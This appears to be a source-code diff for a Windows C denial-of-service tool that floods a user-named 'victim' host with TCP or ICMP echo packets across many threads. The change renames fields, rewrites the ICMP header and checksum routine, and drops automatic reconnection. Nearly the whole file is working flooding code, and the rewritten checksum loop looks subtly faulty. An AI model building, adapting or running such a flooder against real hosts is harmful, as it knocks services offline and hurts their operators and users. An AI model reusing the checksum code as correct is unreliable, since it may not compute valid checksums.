@@ -3,6 +3,7 @@
 #include <WinSock2.h>
 #include <ws2tcpip.h>
 #include <Windows.h>
+#include <iphlpapi.h>
 #include <conio.h>
 #include <time.h>
 #include <stdint.h>
@@ -10,6 +11,7 @@
 #pragma comment (lib, "Ws2_32.lib")
 #pragma comment (lib, "Mswsock.lib")
 #pragma comment (lib, "AdvApi32.lib")
+#pragma comment(lib, "IPHLPAPI.lib")
 
 //structures
 struct DoSInfo
@@ -17,30 +19,16 @@ struct DoSInfo
 	char* victim;
 	char* service;
 	addrinfo* hint;
-	void* pkg;
-	DWORD pkg_size;
+	void* pkt;
+	DWORD pkt_size;
 	DWORD delay;
 };
 
 struct ICMP_Pkt
 {
-	uint8_t type;		/* message type */
-	uint8_t code;		/* type sub-code */
-	uint16_t checksum;
-	union
-	{
-		struct
-		{
-			uint16_t	id;
-			uint16_t	sequence;
-		} echo;			/* echo datagram */
-		uint32_t	gateway;	/* gateway address */
-		struct
-		{
-			uint16_t	__unused;
-			uint16_t	mtu;
-		} frag;			/* path mtu discovery */
-	} un;
+	uint8_t type;
+	uint8_t code;
+	uint16_t checksum,id,sequence;
 };
 
 //functions
@@ -103,51 +91,45 @@ void cls(HANDLE hConsole)
 	SetConsoleCursorPosition(hConsole, coordScreen);
 }
 
-uint16_t calc_chksum(void* data, size_t len)
+uint16_t calc_chksum(const ICMP_Pkt* data, size_t len)
 {
-	size_t left = len;
-	uint16_t* w = (uint16_t*)data;
-	uint32_t sum = 0;
-	while (left > 1)
-	{
-		sum += *(w++);
-		left -= sizeof(uint16_t);
-	}
-	if (left == 1)
-	{
-		uint16_t u;
-		*(uint8_t*)(&u) = *(uint8_t*)w;
-		sum += u;
-	}
-	sum = (sum >> 16) + (sum & 0xffff);
-	sum += (sum >> 16);
-	return ~sum;
+	uint16_t sum = 0;
+	const uint8_t* ptr = (uint8_t*)data;
+	//we sum all the data
+	for (size_t l = 0; l < len; l += 2)
+		sum += MAKEWORD(ptr[l++], (l + 1 < len) ? ptr[l++] : 0);
+	//then not-ing it and parsing it into little endian.
+	return htons(~sum);
 }
 
 //global vars for threads
 static size_t data = 0, pings = 0;
 static UINT exit_code = -1;
-static bool run = true, start = false;
+static bool run = true, start = false, change_pkt = false;
 
 DWORD WINAPI DoSThread(LPVOID lParam)
 {
 	const DoSInfo* info = (DoSInfo*)lParam;
-	DWORD res = 0, max_pkg_size = 65536;
+	DWORD res = 0, max_pkt_size = 65536;
 	int res_size=sizeof(DWORD);
 	long long sent = 0;
 	bool keepaliveb = true;
 	SOCKET sock = INVALID_SOCKET;
 	addrinfo* result;
 
-set:
 	//connect
-	ErrChk(getaddrinfo(info->victim, info->service, info->hint, &result), "getaddrinfo");
+	if (getaddrinfo(info->victim, info->service, info->hint, &result))
+	{
+		printf("An error %u occord in getaddrinfo.\nCheck https://docs.microsoft.com/he-il/windows/win32/winsock/windows-sockets-error-codes-2 for more information.\n", WSAGetLastError());
+		run = false;
+		exit(-1);
+	}
 	for (addrinfo* ptr = result; ptr != NULL; ptr = ptr->ai_next)
 	{
 		sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
 		if (sock == INVALID_SOCKET)
 		{
-			puts("Error in creating socket");
+			puts("Error in creating socket.");
 			return -1;
 		}
 		if (connect(sock, ptr->ai_addr, ptr->ai_addrlen) == SOCKET_ERROR)
@@ -167,22 +149,21 @@ set:
 	}
 
 	//set
-	ErrChk(getsockopt(sock, SOL_SOCKET, SO_SNDBUF, (char*)& max_pkg_size, &res_size), "getsockopt");
-	if (info->pkg_size > max_pkg_size && max_pkg_size)
+	ErrChk(getsockopt(sock, SOL_SOCKET, SO_SNDBUF, (char*)& max_pkt_size, &res_size), "getsockopt");
+	if (info->pkt_size > max_pkt_size && max_pkt_size)
 	{
-		printf("The packet size that you have chose is too big...\nThe sockets of this type have a limit of %llu bytes.\n", (unsigned long long)max_pkg_size);
+		printf("The packet size that you have chose is too big...\nThe sockets of this type have a limit of %llu bytes.\n", (unsigned long long)max_pkt_size);
 		run = false;
 		exit(-1);
 	}
-	ErrChk(setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (char*) & (info->pkg_size), sizeof(DWORD)), "setsockopt");
-	ErrChk(setsockopt(sock, SOL_SOCKET, SO_RCVBUF, (char*) & (info->pkg_size), sizeof(DWORD)), "setsockopt");
-	
+	ErrChk(setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (char*) & (info->pkt_size), sizeof(DWORD)), "setsockopt");
+	ErrChk(setsockopt(sock, SOL_SOCKET, SO_RCVBUF, (char*) & (info->pkt_size), sizeof(DWORD)), "setsockopt");
 	//wait...
-	while (!start)Sleep(100);//We use Sleep to keep the CPU usage low. If we won't use it, the CPU will probably be at 100%
+	while (!start)Sleep(10);//We use Sleep to keep the CPU usage low. If we won't use it, the CPU will probably be at 100%
 	//attack!
 	while (run)
 	{
-		sent = send(sock, (char*)info->pkg, info->pkg_size, 0);
+		sent = send(sock, (char*)info->pkt, info->pkt_size, 0);
 		pings++;
 		if (sent <= 0)
 		{
@@ -193,11 +174,7 @@ set:
 				puts("\nA WSAECONNABORTED error has occord.\nA software in your PC has closed the connection, or maybe the timeout passed.");
 				break;
 			case WSAECONNRESET:
-				/*
-				We try to save the day!
-				If the connection is dead, we need to create a new one!
-				*/
-				goto set;
+				puts("\nA WSAECONNRESET error has occord.\nThe remote host has closed the connection or maybe you can't acess it.");
 				break;
 			case WSAECONNREFUSED:
 				puts("\nA WSAECONNREFUSED error has occord.\nThe remote host refused to the connection.");
@@ -251,7 +228,7 @@ int main(int argc, char** argv)
 	addrinfo victim = { 0 }, * result = NULL;
 	WSADATA wsa;
 	DWORD delay = 0;
-	DWORD pkg_size = 1, max_pkg_size = SO_MAX_MSG_SIZE;
+	DWORD pkt_size = 1, max_pkt_size = SO_MAX_MSG_SIZE;
 	int res_size=sizeof(DWORD);
 	size_t threads_num = 2;
 	HANDLE* threads;
@@ -295,8 +272,8 @@ int main(int argc, char** argv)
 	}
 
 	if (mode_tcp)port = argv[3];
-	pkg_size = strtoul(argv[3 + mode_tcp], NULL, 10);
-	if (pkg_size <= 0 || (mode_tcp == false && (pkg_size > 65467 || pkg_size<sizeof(ICMP_Pkt))))
+	pkt_size = strtoul(argv[3 + mode_tcp], NULL, 10);
+	if (pkt_size <= 0 || (mode_tcp == false && pkt_size < sizeof(ICMP_Pkt)))
 	{
 		printf("Invalid packet size.\nThe packet size of this mode should be %s.\n", (mode_tcp) ? "nonzero" : "between 16 to 65467");
 		return -1;
@@ -304,23 +281,19 @@ int main(int argc, char** argv)
 
 	ErrChk(WSAStartup(MAKEWORD(2, 2), &wsa), "WSAStartup");
 	
-	buff = (BYTE*)malloc(pkg_size);
+	buff = (BYTE*)malloc(pkt_size);
 	if (!buff)
 	{
 		puts("Allocation error.");
 		return -1;
 	}
-	if (mode_tcp)
-	{
-		buff[pkg_size - 1] = 0;
-		for (size_t l = 0; l < pkg_size - 1; l++)
-		{
-			buff[l] = 'A';
-		}
-	}
-	else
+	for (size_t l = (mode_tcp) ? 0 : sizeof(ICMP_Pkt); l < pkt_size; l++)
+		buff[l] = 0;
+
+	if(!mode_tcp)
 	{
 		ICMP_Pkt* ipkt = (ICMP_Pkt*)buff;
+		ZeroMemory(ipkt, sizeof(ICMP_Pkt));
 		if (ipkt == NULL)
 		{
 			puts("Allocation error.");
@@ -329,13 +302,10 @@ int main(int argc, char** argv)
 		//set the packet
 		ipkt->type = 8;
 		ipkt->code = 0;
-		ipkt->un.echo.sequence = 0;
-		ipkt->un.echo.id = 0;
+		ipkt->sequence = 0;
+		ipkt->id = GetCurrentProcessId();
 		ipkt->checksum = 0;
-		ipkt->checksum = calc_chksum(ipkt, sizeof(ICMP_Pkt));
-		//set the additional data
-		for (size_t l = sizeof(ICMP_Pkt); l < pkg_size; l++)
-			buff[l] = 'A';
+		ipkt->checksum = calc_chksum(ipkt, pkt_size);
 	}
 
 	threads_num = strtoull(argv[4 + mode_tcp], NULL, 10);
@@ -353,11 +323,11 @@ int main(int argc, char** argv)
 
 	delay = strtoull(argv[5 + mode_tcp], NULL, 10);
 
-	printf("You have chose to attack \'%s:%s\' with a packet size of %llu, a total of %llu threads (and sockets) and a delay of %llu between packets.\nContinue? ", argv[1], (mode_tcp) ? port : "ICMP", (unsigned long long)pkg_size, threads_num, (unsigned long long)delay);
+	printf("You have chose to attack \'%s:%s\' with a packet size of %llu, a total of %llu threads (and sockets) and a delay of %llu between packets.\nContinue? ", argv[1], (mode_tcp) ? port : "ICMP", (unsigned long long)pkt_size, threads_num, (unsigned long long)delay);
 	if (getchar() != 'y')return -1;
 
 	//set the args for the threads
-	DoSInfo info = { argv[1], (mode_tcp) ? port : NULL, &victim, buff, pkg_size, delay };
+	DoSInfo info = { argv[1], (mode_tcp) ? port : NULL, &victim, buff, pkt_size, delay };
 	start = false;
 	//create the monitoring thread
 	threads[0] = CreateThread(NULL, 0, SpeedThread, argv[1], 0, NULL);
